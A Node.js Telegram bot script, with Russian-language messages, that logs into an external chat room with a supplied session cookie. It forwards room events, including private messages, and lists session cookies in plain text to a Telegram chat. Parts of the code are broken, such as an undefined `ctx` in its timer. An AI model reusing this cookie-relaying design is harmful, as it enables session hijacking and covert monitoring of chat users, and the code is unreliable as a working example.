const { Bot } = require('../lib/bot.js')
const fs = require('fs')
const { Telegraf } = require('telegraf')

const db = {'tok': '', 'chatID': ''}
var TG = new Telegraf(db.tok);
var logs = {}
var bot = {}
var p;

const chars = {
  "_": "\\_",
  "*": "\\*",
  "[": "\\[",
  "`": "\\`"
};
const reChar = new RegExp("_|\\*|\\[|`", "gi");

log2mkd = (type, e, room) => {
    let text = "";

    e.user = e.user.replace(reChar, m => chars[m]);
    e.text = e.text.replace(reChar, m => chars[m]);

    if (type === "msg") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "`: " } else { text += ": " } text += e.text; if (e.url) { text += " [URL](" + e.url + ")" } else { text += "" } return text;
    }
    else if (type === "me") {
        text += "Действие | " + "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "`: _" } else text += ": _"; text += e.text + "_"; if (e.url) { text += " [URL](" + e.url + ")" } else text += ""; return text;
    }
    else if (type === "dm") {
        text += "ЛС | " + "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "`: " } else text += ": "; text += e.text; if (e.url) { text += " [URL](" + e.url + ")" } else text += ""; return text;
    }
    else if (type === "join") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "` в чате." } else text += " в чате."; return text;
    }
    else if (type === "leave") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "` покинул(а) чат." } else text += " покинул(а) чат."; return text;
    }
    else if (type === "new-host") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "` стал(a) новым хостом." } else text += " стал(a) новым хостом."; return text;
    }
    else if (type === "room-profile") {
        text += "Название комнаты изменено на *" + room.name + "*."; return text;
    }
    else if (type === "new-description") {
        text += "Описание комнаты изменено на *" + room.desc + "*."; return text;
    }
    else if (type === "music") {
        text += "*" + e.user + "*"; if (e.trip) { text += "`#" + e.trip + "` поделился музыкой --- " + room.music.name + " [URL](" + room.music.url + ")" } else text += " поделился музыкой --- " + room.music.name + " [URL](" + room.music.url + ")."; return text;
    }

}

sendTg = (chat_id, type, e, roomLog) => {
    TG.telegram.sendMessage(db.chatID, log2mkd(type, e, roomLog), { parse_mode: "Markdown" });
}

checkTG = (ctx, callback) => {
    if (JSON.stringify(ctx.message.chat.id).match(db.chatID)) {
        callback();
    }
}

TG.command("join", (ctx) => {
    checkTG(ctx, () => {
        let cookie = ctx.message.text.replace("/join ", "");
        bot[1] = new Bot();
        bot[1].cookie = cookie;
        bot[1].getReady(() => bot[1].startHandle());
        p = bot[1].room.roomId;
        ctx.reply('Бот подключен.');

        bot[1].event(["msg", "dm", "me", "join", "leave", "new-host", "room-profile", "new-description", "music", "kick", "ban"], (u, m, url, trip, eventObject) => {
        	if ((eventObject.type === "music") || (u !== bot[1].profile.name)) {
                bot[1].getRoom(() => {
                    let title = "";
                    let url = "";

                    if (bot[1].room.np) {
                        title = bot[1].room.np.name;
                        url = bot[1].room.np.url;
                    }

                    room = {
                        name: bot[1].room.name,
                        desc: bot[1].room.description,
                        music: {
                            name: title,
                            url: url
                        }
                    };

                    sendTg(db.chatID, eventObject.type, eventObject, room);
                })
        	}
        });
    })
});

TG.command("leave", (ctx) => {
    checkTG(ctx, () => {
        delete bot[1];
        p = '';
        ctx.reply('Бот отключен.');
    });
});

TG.command("all", (ctx) => {
    checkTG(ctx, () => {
        if (logs) {
            let text = 'Боты\n';
            Object.keys(logs).forEach(x => {
                bot['pre'] = new Bot();
                bot['pre'].cookie = logs[x].cookie;
                bot['pre'].getReady(() => bot['pre'].startHandle());
                logs[x]['title'] = bot['pre'].room.name;
                logs[x]['users'] = bot['pre'].users.map(u => u.name);
                text += ("\n\nКомната: `" + logs[x].title + "`\nПользователи: `" + logs[x].users.join(', ') + "`\nКуки: `" + logs[x].cookie + "`");
                delete bot['pre'];
            });
            ctx.reply(text, { parse_mode: "Markdown" });
        } else ctx.reply('Ботов нет.', { parse_mode: "Markdown" });
    });
});

TG.launch();

setInterval(() => {
    let bots;
    try { bots = JSON.parse(fs.readFileSync("./conf/l.json", "utf8")); }
    catch { bots = false }
    if (bots) {
        Object.keys(bots).forEach(x => {
            if (!Object.keys(logs).includes(x)) {
                logs[x] = bots[x];
                TG.telegram.sendMessage(db.chatID, "Новый бот запущен\n\nКомната: `" + logs[x].title + "`\nПользователи: `" + logs[x].users.join(', ') + "`\nКуки: `" + logs[x].cookie + "`", { parse_mode: "Markdown" });
            }
        });
        Object.keys(logs).forEach(x => {
            if (!Object.keys(bots).includes(x)) {
                delete logs[x]
                if (p && (!Object.keys(logs).includes(p))) {
                    delete bot[1];
                    p = '';
                    ctx.reply('Бот отключен.')
                }
            }
        });
    }
}, 5000)
